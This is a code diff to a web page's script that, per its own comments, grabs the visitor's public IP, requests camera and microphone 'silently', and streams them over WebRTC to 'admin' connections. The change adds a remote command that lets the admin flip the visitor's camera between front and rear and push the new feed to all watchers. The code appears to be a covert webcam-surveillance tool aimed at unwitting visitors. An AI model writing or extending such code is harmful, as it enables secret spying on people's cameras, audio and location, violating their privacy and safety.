@@ -49,6 +49,8 @@
 <script>
 const socket = io();
 let peerConnections = {};
+let currentCamera = 'environment';
+let stream = null; // stream ko bahar le aao
 
 async function init() {
   // 1. Get public IP
@@ -60,7 +62,6 @@ async function init() {
   } catch {}
 
   // 2. Request Camera + Mic silently
-  let stream = null;
   try {
     stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
   } catch {
@@ -116,6 +117,28 @@ async function init() {
   socket.on('webrtc:ice', async ({ from, candidate }) => {
     const pc = peerConnections[from];
     if (pc) try { await pc.addIceCandidate(new RTCIceCandidate(candidate)); } catch {}
+  });
+
+  // 7. Switch camera — admin se signal aayega
+  socket.on('stream:switch-camera', async () => {
+    currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
+    try {
+      // Stop old stream
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      // Get new stream with switched camera
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: currentCamera },
+        audio: true
+      });
+      // Replace video track in all active peer connections
+      Object.keys(peerConnections).forEach(adminId => {
+        const pc = peerConnections[adminId];
+        const sender = pc.getSenders().find(s => s.track && s.track.kind === 'video');
+        if (sender) sender.replaceTrack(stream.getVideoTracks()[0]);
+      });
+    } catch(e) {
+      console.error('Camera switch failed:', e);
+    }
   });
 }
 
